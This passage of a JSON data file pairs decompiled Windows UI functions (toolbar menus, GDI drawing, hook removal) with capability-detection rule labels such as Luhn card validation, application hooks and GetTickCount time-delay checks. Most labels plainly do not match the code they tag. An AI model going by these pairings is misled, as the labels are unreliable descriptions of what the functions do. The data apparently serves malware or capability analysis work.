0xaa) {\n                        return 5;\n                    }\n                    return 1;\n                }\n                return 3;\n            }\n            if (param_1 == 0xb7) {\n                return 5;\n            }\n            if (param_1 == 0xbf) {\n                return 6;\n            }\n            if (param_1 == 0xc1) {\n                return 6;\n            }\n            iVar1 = param_1 - 0xce;\n            if (iVar1 == 0) {\n                return 3;\n            }\n        }\n        if (iVar1 == 2) {\ncode_r0x004319c1:\n            return 3;\n        }\n    }\ncode_r0x004319c1:\n    return 1;\n}\n",
        "token_count": 1734
    },
    "00433c6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433c6c(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    int32_t arg_8h_00;\n    \n    arg_8h_00 = fcn.00402110(arg_10h + arg_18h);\n    fcn.00419370(arg_8h_00, arg_ch, arg_10h);\n    fcn.00419370(arg_8h_00 + arg_10h, arg_14h, arg_18h);\n    fcn.00401730(arg_10h + arg_18h);\n    return;\n}\n",
        "token_count": 153
    },
    "00436084": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00436084(uint param_1)\n\n{\n    fcn.00438818();\n    fcn.00438ea6(0x437fde);\n    fcn.00438b96(param_1);\n    return;\n}\n",
        "token_count": 55
    },
    "004360a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004360a8(uint param_1)\n\n{\n    fcn.00438818();\n    fcn.00438ea6(0x437fde);\n    fcn.00438ba9(param_1);\n    return;\n}\n",
        "token_count": 56
    },
    "00436573": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_fch\n// WARNING: Variable defined which should be unmapped: var_ech\n// WARNING: Variable defined which should be unmapped: lpmi\n// WARNING: Variable defined which should be unmapped: var_c8h\n// WARNING: Variable defined which should be unmapped: var_c4h\n// WARNING: Variable defined which should be unmapped: var_bch\n// WARNING: Variable defined which should be unmapped: var_ach\n// WARNING: Variable defined which should be unmapped: var_a8h\n// WARNING: Variable defined which should be unmapped: var_9ch_2\n// WARNING: Variable defined which should be unmapped: var_88h\n// WARNING: Variable defined which should be unmapped: var_7ch\n// WARNING: Variable defined which should be unmapped: var_68h_2\n// WARNING: Variable defined which should be unmapped: hmenu\n// WARNING: Variable defined which should be unmapped: lprc\n// WARNING: Variable defined which should be unmapped: dy\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h_2\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h_2\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h_2\n// WARNING: Variable defined which should be unmapped: var_24h_2\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch_2\n// WARNING: Variable defined which should be unmapped: var_18h_2\n// WARNING: Variable defined which should be unmapped: var_14h_2\n// WARNING: Variable defined which should be unmapped: var_4h_2\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: item\n// WARNING: Variable defined which should be unmapped: var_10h_2\n\nuint __cdecl\nfcn.00436573(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint noname_33, uint noname_34, uint noname_35, uint noname_36, uint noname_37, \n            uint noname_38, uint noname_39, uint noname_40, uint noname_41, uint noname_42, uint noname_43, \n            uint noname_44, uint noname_45, uint noname_46, uint noname_47, uint noname_48, uint noname_49, \n            uint noname_50, uint noname_51, uint noname_52, uint noname_53, uint noname_54, uint noname_55, \n            uint noname_56, uint noname_57, uint noname_58, uint noname_59, uint noname_60, uint noname_61, \n            uint noname_62, uint noname_63, uint noname_64, uint noname_65, uint noname_66, uint noname_67, \n            uint noname_68, uint noname_69, uint noname_70, uint noname_71, uint noname_72, uint noname_73, \n            uint noname_74, uint noname_75, uint noname_76, uint noname_77, uint noname_78, uint noname_79, \n            uint noname_80, uint noname_81, uint noname_82, uint noname_83, uint noname_84, uint noname_85, \n            uint noname_86, uint noname_87, uint noname_88, uint noname_89, uint noname_90, uint noname_91, \n            uint noname_92, uint noname_93, uint noname_94, uint noname_95, uint noname_96, uint noname_97, \n            uint noname_98, uint noname_99, uint noname_100, uint noname_101, uint noname_102, uint noname_103, \n            uint noname_104, uint noname_105, uint noname_106, uint noname_107, uint noname_108, uint noname_109, \n            uint noname_110, uint noname_111, uint noname_112, uint noname_113, uint noname_114, uint noname_115, \n            uint noname_116, uint noname_117, uint noname_118, uint noname_119, uint noname_120, uint arg_8h, uint hWnd)\n\n{\n    uint *noname_1_00;\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint noname_7_00;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    code **ppcVar8;\n    uint extraout_ECX;\n    uint unaff_EBX;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint32_t uVar9;\n    uint unaff_EDI;\n    uint32_t uVar10;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint var_8h;\n    uint item;\n    uint var_10h_2;\n    uint var_168h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_13ch;\n    uint lprcDst;\n    uint lprcSrc2;\n    uint var_cch;\n    uint var_9ch;\n    uint lprcSrc1;\n    uint var_70h;\n    uint var_68h;\n    uint var_48h;\n    uint var_34h;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uint noname_3_00;\n    uint noname_4_00;\n    uint noname_5_00;\n    char *noname_10_00;\n    uint in_stack_fffffeb0;\n    uint in_stack_fffffeb4;\n    uint in_stack_fffffeb8;\n    uint in_stack_fffffebc;\n    uint in_stack_fffffec0;\n    uint in_stack_fffffec4;\n    uint in_stack_fffffec8;\n    uint in_stack_fffffecc;\n    uint in_stack_fffffed0;\n    uint in_stack_fffffed4;\n    uint in_stack_fffffed8;\n    uint in_stack_fffffedc;\n    uint in_stack_fffffee0;\n    uint in_stack_fffffee4;\n    uint in_stack_fffffee8;\n    uint in_stack_fffffeec;\n    uint in_stack_fffffef0;\n    uint in_stack_fffffef4;\n    uint in_stack_fffffef8;\n    uint in_stack_fffffefc;\n    uint var_fch;\n    uint in_stack_ffffff04;\n    uint in_stack_ffffff08;\n    uint in_stack_ffffff0c;\n    uint var_ech;\n    uint in_stack_ffffff14;\n    uint in_stack_ffffff18;\n    uint in_stack_ffffff1c;\n    uint in_stack_ffffff20;\n    uint in_stack_ffffff24;\n    uint in_stack_ffffff28;\n    uint in_stack_ffffff2c;\n    uint lpmi;\n    uint var_c8h;\n    uint var_c4h;\n    uint in_stack_ffffff3c;\n    uint var_bch;\n    uint in_stack_ffffff44;\n    uint in_stack_ffffff48;\n    uint in_stack_ffffff4c;\n    uint var_ach;\n    uint var_a8h;\n    uint in_stack_ffffff58;\n    uint in_stack_ffffff5c;\n    uint var_9ch_2;\n    uint in_stack_ffffff64;\n    uint in_stack_ffffff68;\n    uint in_stack_ffffff6c;\n    uint in_stack_ffffff70;\n    uint var_88h;\n    uint in_stack_ffffff78;\n    uint in_stack_ffffff7c;\n    uint var_7ch;\n    uint in_stack_ffffff84;\n    uint in_stack_ffffff88;\n    uint in_stack_ffffff8c;\n    uint in_stack_ffffff90;\n    uint var_68h_2;\n    uint hmenu;\n    uint in_stack_ffffff9c;\n    uint in_stack_ffffffa0;\n    uint lprc;\n    uint dy;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h_2;\n    uint var_44h;\n    uint in_stack_ffffffbc;\n    uint in_stack_ffffffc0;\n    uint var_38h;\n    uint var_34h_2;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h_2;\n    uint var_24h_2;\n    uint var_20h;\n    uint var_1ch_2;\n    uint var_18h_2;\n    uint var_14h_2;\n    uint in_stack_ffffffec;\n    uint in_stack_fffffff0;\n    uint in_stack_fffffff4;\n    uint var_4h_2;\n    uint noname_97_00;\n    \n    noname_97_00 = 0x43657d;\n    fcn.00419340();\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    piVar2 = fcn.004308e7();\n    iVar3 = (**(*piVar2 + 0xc))();\n    *(unaff_EBP + -0x10) = iVar3 + 0x10;\n    *(unaff_EBP + -4) = 0;\n    noname_10_00 = \"ReBarWindow32\";\n    iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n    iVar4 = iVar4 + 1;\n    iVar3 = iVar4;\n    noname_7_00 = fcn.00402110();\n    noname_1_00 = *(unaff_EBP + 0xc);\n    uVar7 = *noname_1_00;\n    (*_sym.imp.USER32.dll_GetClassNameA)();\n    noname_5_00 = 0xffffffff;\n    fcn.0040f065();\n    noname_4_00 = *noname_1_00;\n    iVar5 = fcn.0042cb28();\n    *(unaff_EBP + 0xc) = iVar5;\n    iVar6 = fcn.0041869d(*(unaff_EBP + -0x10), \"ReBarWindow32\");\n    if ((iVar6 == 0) && (iVar5 != 0)) {\n        noname_3_00 = 0x4407c8;\n        iVar6 = fcn.00430a13();\n        if (iVar6 != 0) {\n            iVar6 = fcn.0042d465();\n            if ((iVar6 != 0) && (*(unaff_EBP + -0x14) != iVar6)) {\n                uVar7 = fcn.00436573(*(unaff_EBP + 8), noname_1_00, *(unaff_EBP + 0x10), noname_3_00, noname_4_00, \n                                     noname_5_00, uVar7, noname_7_00, iVar4, iVar3, noname_10_00, unaff_EDI, unaff_ESI, \n                                     unaff_EBX, in_stack_fffffeb0, in_stack_fffffeb4, in_stack_fffffeb8, \n                                     in_stack_fffffebc, in_stack_fffffec0, in_stack_fffffec4, in_stack_fffffec8, \n                                     in_stack_fffffecc, in_stack_fffffed0, in_stack_fffffed4, in_stack_fffffed8, \n                                     in_stack_fffffedc, in_stack_fffffee0, in_stack_fffffee4, in_stack_fffffee8, \n                                     in_stack_fffffeec, in_stack_fffffef0, in_stack_fffffef4, in_stack_fffffef8, \n                                     in_stack_fffffefc, var_fch, in_stack_ffffff04, in_stack_ffffff08, in_stack_ffffff0c\n                                     , var_ech, in_stack_ffffff14, in_stack_ffffff18, in_stack_ffffff1c, \n                                     in_stack_ffffff20, in_stack_ffffff24, in_stack_ffffff28, in_stack_ffffff2c, lpmi, \n                                     var_c8h, var_c4h, in_stack_ffffff3c, var_bch, in_stack_ffffff44, in_stack_ffffff48\n                                     , in_stack_ffffff4c, var_ach, var_a8h, in_stack_ffffff58, in_stack_ffffff5c, \n                                     var_9ch_2, in_stack_ffffff64, in_stack_ffffff68, in_stack_ffffff6c, \n                                     in_stack_ffffff70, var_88h, in_stack_ffffff78, in_stack_ffffff7c, var_7ch, \n                                     in_stack_ffffff84, in_stack_ffffff88, in_stack_ffffff8c, in_stack_ffffff90, \n                                     var_68h_2, hmenu, in_stack_ffffff9c, in_stack_ffffffa0, lprc, dy, var_50h, var_4ch\n                                     , var_48h_2, var_44h, in_stack_ffffffbc, in_stack_ffffffc0, var_38h, var_34h_2, \n                                     var_30h, var_2ch, var_28h_2, var_24h_2, var_20h, var_1ch_2, var_18h_2, var_14h_2, \n                                     in_stack_ffffffec, in_stack_fffffff0, in_stack_fffffff4, var_4h_2, noname_97_00, \n                                     unaff_retaddr, var_8h, item, var_10h_2, noname_3, noname_4, noname_5, noname_6, \n                                     noname_7, noname_8, noname_9, noname_10, noname_11, noname_12, noname_13, noname_14\n                                     , noname_15, noname_16, noname_17, noname_18, noname_19, noname_20, noname_21, \n                                     noname_22, noname_23);\n                goto code_r0x00436a53;\n            }\n            fcn.004301f3();\n            *(unaff_EBP + -4) = 1;\n            piVar2 = fcn.004308e7();\n            iVar3 = (**(*piVar2 + 0xc))();\n            *(unaff_EBP + 8) = iVar3 + 0x10;\n            *(unaff_EBP + -4) = 2;\n            piVar2 = fcn.004308e7();\n            iVar3 = (**(*piVar2 + 0xc))();\n            *(unaff_EBP + -0x18) = iVar3 + 0x10;\n            *(unaff_EBP + -4) = 3;\n            fcn.00432160();\n            *(unaff_EBP + -4) = 4;\n            fcn.004325f1(*(unaff_EBP + -0x14));\n            pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n            *(unaff_EBP + -4) = 5;\n            *(unaff_EBP + -0x15c) = 0x50;\n            *(unaff_EBP + -0x158) = 0x10;\n            (*pcVar1)();\n            (*pcVar1)(*(iVar5 + 0x1c), 0x409, noname_1_00[3], unaff_EBP + -0x78);\n            iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(\"ToolbarWindow32\");\n            uVar7 = fcn.00402110(iVar3 + 1, iVar3 + 1);\n            (*_sym.imp.USER32.dll_GetClassNameA)(*(unaff_EBP + -0x13c), uVar7);\n            fcn.0040f065();\n            uVar7 = fcn.0042cb28();\n            *(unaff_EBP + -0x28) = uVar7;\n            iVar3 = fcn.0041869d(*(unaff_EBP + -0x10), \"ToolbarWindow32\");\n            if ((iVar3 == 0) && (iVar3 = *(unaff_EBP + -0x28),  iVar3 != 0)) {\n                iVar4 = fcn.00430a13();\n                if (iVar4 != 0) {\n                    *(unaff_EBP + -0x70) = noname_1_00[6];\n                    *(unaff_EBP + -0x34) = noname_1_00 + 6;\n                    fcn.00432390();\n                    fcn.00432354();\n                    iVar4 = fcn.0040f319();\n                    *(unaff_EBP + -0x1c) = iVar4;\n                    do {\n                        iVar4 = iVar4 + -1;\n                        uVar7 = *(iVar3 + 0x1c);\n                        *(unaff_EBP + 0xc) = iVar4;\n                        (*pcVar1)(uVar7, 0x41d, iVar4, unaff_EBP + -0xdc);\n                        iVar5 = (*_sym.imp.USER32.dll_IntersectRect)\n                                          (unaff_EBP + -0x10c, unaff_EBP + -0x78, unaff_EBP + -0xdc);\n                        if (iVar5 != 0) break;\n                    } while (iVar4 != 0);\n                    fcn.004192e0(unaff_EBP + -0xcc, 0, 0x30);\n                    *(unaff_EBP + -0xcc) = 0x30;\n                    iVar4 = fcn.0040f353();\n                    iVar3 = *(unaff_EBP + -0x1c);\n                    uVar10 = *(unaff_EBP + 0xc);\n                    fcn.00418b80();\n                    *(unaff_EBP + -0x24) = &stack0xfffffe70;\n                    uVar9 = 0;\n                    fcn.004192e0(*(unaff_EBP + -0x24), 0, (iVar3 - uVar10) * 4);\n                    uVar7 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n                    fcn.00430186(uVar7);\n                    fcn.0040e724(unaff_EBP + -0x9c);\n                    pcVar1 = _sym.imp.USER32.dll_CopyRect;\n                    *(unaff_EBP + -0x20) = 0;\n                    if (uVar10 < *(unaff_EBP + -0x1c)) {\n                        do {\n                            fcn.00433f8b(*(unaff_EBP + 0xc), unaff_EBP + -0x30, unaff_EBP + -0x38, unaff_EBP + -0x2c);\n                            if ((*(unaff_EBP + -0x38) & 1) == 0) {\n                                *(unaff_EBP + -200) = 0x162;\n                                fcn.00402ca0(*(unaff_EBP + -0x30));\n                                fcn.00430865(unaff_EBP + -0x18, *(unaff_EBP + 8), 1, 10);\n                                ppcVar8 = fcn.0042f804(8);\n                                if (ppcVar8 == NULL) {\n                                    ppcVar8 = NULL;\n                                }\n                                else {\n                                    ppcVar8[1] = NULL;\n                                    *ppcVar8 = vtable.CBitmap.0;\n                                }\n                                piVar2 = *(unaff_EBP + -0x24) + uVar9 * 4;\n                                *piVar2 = ppcVar8;\n                                (*_sym.imp.COMCTL32.dll_ImageList_GetImageInfo)\n                                          (*(iVar4 + 4), *(unaff_EBP + -0x2c), unaff_EBP + -0xfc);\n                                (*pcVar1)(unaff_EBP + -0x58, unaff_EBP + -0xec);\n                                (*_sym.imp.USER32.dll_OffsetRect)\n                                          (unaff_EBP + -0x58, -*(unaff_EBP + -0x58), -*(unaff_EBP + -0x54));\n                                fcn.0040f2a5(unaff_EBP + -0x9c, *(unaff_EBP + -0x50), *(unaff_EBP + -0x4c));\n                                iVar3 = *piVar2;\n                                if (iVar3 != 0) {\n                                    iVar3 = *(iVar3 + 4);\n                                }\n                                iVar3 = fcn.004328e0(*(unaff_EBP + -0x44), iVar3);\n                                *piVar2 = iVar3;\n                                (*_sym.imp.USER32.dll_GetSysColor)(4);\n                                fcn.00436d90();\n                                fcn.0040f32c(unaff_EBP + -0x48, *(unaff_EBP + -0x2c), 0, 0, 1);\n                                iVar3 = *piVar2;\n                                if (iVar3 != 0) {\n                                    iVar3 = *(iVar3 + 4);\n                                }\n                                iVar3 = fcn.004328e0(*(unaff_EBP + -0x44), iVar3);\n                                *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 1;\n                                *piVar2 = iVar3;\n                                *(unaff_EBP + -0xa8) = *(unaff_EBP + -0x18);\n                                *(unaff_EBP + -0xbc) = *(unaff_EBP + -0x30);\n                                *(unaff_EBP + -0xc4) = 0x100;\n                                uVar9 = *(unaff_EBP + -0x20);\n                                *(unaff_EBP + -0xac) = *piVar2;\ncode_r0x0043695a:\n                                (*_sym.imp.USER32.dll_InsertMenuItemA)\n                                          (*(unaff_EBP + -100), *(unaff_EBP + 0xc), 1, unaff_EBP + -0xcc);\n                            }\n                            else if (uVar9 != 0) {\n                                *(unaff_EBP + -200) = 0x100;\n                                *(unaff_EBP + -0xc4) = 0x800;\n                                goto code_r0x0043695a;\n                            }\n                            *(unaff_EBP + 0xc) = *(unaff_EBP + 0xc) + 1;\n                        } while (*(unaff_EBP + 0xc) < *(unaff_EBP + -0x1c));\n                    }\n                    (*pcVar1)(unaff_EBP + -0x88, *(unaff_EBP + -0x34));\n                    fcn.00432390();\n                    fcn.0042c174(0, *(unaff_EBP + -0x88), *(unaff_EBP + -0x7c), *(unaff_EBP + -0x14), 0);\n                    uVar10 = 0;\n                    **(unaff_EBP + 0x10) = 0;\n                    if (uVar9 != 0) {\n                        do {\n                            piVar2 = *(*(unaff_EBP + -0x24) + uVar10 * 4);\n                            if (piVar2 != NULL) {\n                                (**(*piVar2 + 4))();\n                            }\n                            uVar10 = uVar10 + 1;\n                        } while (uVar10 < uVar9);\n                    }\n                    *(unaff_EBP + -4) = 4;\n                    fcn.0043264c();\n                    *(unaff_EBP + -4) = 3;\n                    fcn.004325d8();\n                    fcn.004014f0();\n                    fcn.004014f0();\n                    *(unaff_EBP + -4) = 0;\n                    fcn.00435ea1();\n                    uVar7 = 1;\n                    goto code_r0x00436a53;\n                }\n            }\n            *(unaff_EBP + -4) = 4;\n            fcn.0043264c();\n            *(unaff_EBP + -4) = 3;\n            fcn.004325d8();\n            fcn.004014f0();\n            fcn.004014f0();\n            *(unaff_EBP + -4) = 0;\n            fcn.00435ea1();\n        }\n    }\n    uVar7 = 0;\ncode_r0x00436a53:\n    fcn.004014f0();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar7;\n}\n",
        "token_count": 5855
    },
    "00436b21": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: ARG_0\n// WARNING: Variable defined which should be unmapped: var_34h\n\nvoid __cdecl fcn.00436b21(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_34h;\n    uint ARG_0;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = *0x44d270;\n    piVar1 = fcn.004308e7();\n    iVar2 = (**(*piVar1 + 0xc))();\n    *(unaff_EBP + -0x34) = iVar2 + 0x10;\n    *(unaff_EBP + -4) = 0;\n    uVar3 = fcn.0042ebfd();\n    if ((uVar3 & 0x4000) == 0) {\n        fcn.0043849a(extraout_ECX + 0xc0);\n        if (*(unaff_EBP + 8) != 0) {\n            fcn.00433d2d(0x43fd24);\n            fcn.00433d2d(*(unaff_EBP + 8));\n            if (0 < *(extraout_ECX + 0x54)) {\n                (*_sym.imp.USER32.dll_wsprintfA)(unaff_EBP + -0x30, 0x43fd28, *(extraout_ECX + 0x54));\n                fcn.00433d2d(unaff_EBP + -0x30);\n            }\n        }\n    }\n    else {\n        if (*(unaff_EBP + 8) != 0) {\n            fcn.00433d2d(*(unaff_EBP + 8));\n            if (0 < *(extraout_ECX + 0x54)) {\n                (*_sym.imp.USER32.dll_wsprintfA)(unaff_EBP + -0x30, 0x43fd28, *(extraout_ECX + 0x54));\n                fcn.00433d2d(unaff_EBP + -0x30);\n            }\n            fcn.00433d2d(0x43fd24);\n        }\n        fcn.0043849a();\n    }\n    fcn.0043356e(*(extraout_ECX + 0x1c), *(unaff_EBP + -0x34));\n    fcn.004014f0();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 615
    },
    "00436ed6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436ed6(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t Y, uint crColor)\n\n{\n    int32_t in_ECX;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.GDI32.dll_SetBkColor)(*(in_ECX + 4), crColor);\n    var_10h = arg_8h;\n    var_8h = arg_8h + arg_10h;\n    var_ch = arg_ch;\n    var_4h = arg_ch + Y;\n    (*_sym.imp.GDI32.dll_ExtTextOutA)(*(in_ECX + 4), 0, 0, 2, &var_10h, 0, 0, 0);\n    return;\n}\n",
        "token_count": 207
    },
    "00436f22": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436f22(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint var_4h;\n    \n    fcn.00436ed6(arg_8h, arg_ch, arg_10h + -1, 1, arg_18h);\n    fcn.00436ed6(arg_8h, arg_ch, 1, arg_14h + -1, arg_18h);\n    fcn.00436ed6(arg_8h + arg_10h, arg_ch, 0xffffffff, arg_14h, arg_1ch);\n    fcn.00436ed6(arg_8h, arg_ch + arg_14h, arg_10h, 0xffffffff, arg_1ch);\n    return;\n}\n",
        "token_count": 200
    },
    "00436f9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00436f9c(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00438818();\n    (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(iVar1 + 0x2c);\n    return;\n}\n",
        "token_count": 58
    },
    "004383c9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004383c9(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    *(param_1 + 0x1c) = 0;\n    *(param_1 + 0x20) = 0;\n    *(param_1 + 0x28) = 0;\n    *(param_1 + 0x2c) = 0;\n    iVar1 = fcn.00438808();\n    *(iVar1 + 0x34) = 0;\n    *(iVar1 + 0x54) = 0;\n    (*_sym.imp.USER32.dll_GetCursorPos)(iVar1 + 0x4c);\n    *(param_1 + 0x3c) = 0;\n    *(param_1 + 0x38) = 0;\n    *(param_1 + 0x24) = 1;\n    return;\n}\n",
        "token_count": 199
    },
    "0043883e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043883e(void)\n\n{\n    fcn.00438818();\n    fcn.00438ea6(0x437fde);\n    return;\n}\n",
        "token_count": 39
    },
    "0043997d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0043997d(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint unaff_retaddr;\n    \n    iVar1 = fcn.00439854(param_1);\n    *param_1 = iVar1;\n    if (iVar1 == 0) {\n        iVar1 = fcn.00439902(unaff_retaddr);\n        *param_1 = iVar1;\n        iVar1 = (-(iVar1 != 0) & 0x7fffbffe) + 0x80004002;\n    }\n    else {\n        fcn.00439962();\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 149
    },
    "00439bb9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __thiscall fcn.00439bb9(int32_t param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    \n    uVar1 = *(param_1 + 0x28);\n    bVar2 = uVar1 < *(param_1 + 0x2c);\n    if (bVar2) {\n        fcn.00419370(param_2, *(param_1 + 0x1c) * uVar1 + *(param_1 + 0x24), *(param_1 + 0x1c));\n        *(param_1 + 0x28) = *(param_1 + 0x28) + 1;\n    }\n    return bVar2;\n}\n",
        "token_count": 166
    },
    "0043a1f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0043a1f4(uint8_t *param_1, uint16_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = *(param_2 * 4 + 0x440f78) + 4;\n    uVar1 = *param_1;\n    while (uVar1 != 0) {\n        if (uVar1 != 0xff) {\n            iVar3 = 0x440fd0;\n            if ((uVar1 & 0x40) == 0) {\n                iVar3 = 0x441028;\n            }\n            iVar2 = iVar2 + *(iVar3 + (uVar1 & 0xffffffbf) * 4);\n        }\n        param_1 = param_1 + 1;\n        uVar1 = *param_1;\n    }\n    return iVar2;\n}\n",
        "token_count": 205
    },
    "0043b066": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043b066(code *param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint unaff_retaddr;\n    \n    *(param_2 + param_3) = unaff_retaddr;\n    *((param_2 + param_3) - param_3) = 0x43b076;\n    (*param_1)();\n    return;\n}\n",
        "token_count": 87
    },
    "0043b15c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "set application hook"
        ],
        "decompiled_code": "\nvoid fcn.0043b15c(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    char *arg_8h;\n    \n    iVar2 = fcn.00438818();\n    fcn.00439038(1);\n    arg_8h = iVar2 + 0x34;\n    while (*arg_8h != '\\0') {\n        puVar3 = fcn.00419ad5(arg_8h, 10);\n        *puVar3 = 0;\n        iVar4 = fcn.00438818();\n        (*_sym.imp.USER32.dll_UnregisterClassA)(arg_8h, *(iVar4 + 8));\n        arg_8h = puVar3 + 1;\n    }\n    *(iVar2 + 0x34) = '\\0';\n    fcn.0043909b(1);\n    iVar2 = fcn.00438818();\n    if ((*(iVar2 + 4) != 0) && (pcVar1 = *(*(iVar2 + 4) + 0x38),  pcVar1 != NULL)) {\n        (*pcVar1)(1, 0);\n    }\n    iVar2 = fcn.0043883e();\n    if (*(iVar2 + 0x3c) != NULL) {\n        iVar4 = (**(**(iVar2 + 0x3c) + 0x138))();\n        if (iVar4 != 0) {\n            *(iVar2 + 0x3c) = 0;\n        }\n    }\n    iVar2 = fcn.00438808();\n    iVar4 = fcn.00438818();\n    pcVar1 = _sym.imp.USER32.dll_UnhookWindowsHookEx;\n    if (*(iVar4 + 0x14) == '\\0') {\n        if (*(iVar2 + 0x2c) != 0) {\n            (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(*(iVar2 + 0x2c));\n            *(iVar2 + 0x2c) = 0;\n        }\n        if (*(iVar2 + 0x28) != 0) {\n            (*pcVar1)(*(iVar2 + 0x28));\n            *(iVar2 + 0x28) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 514
    },
    "00410b1d": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
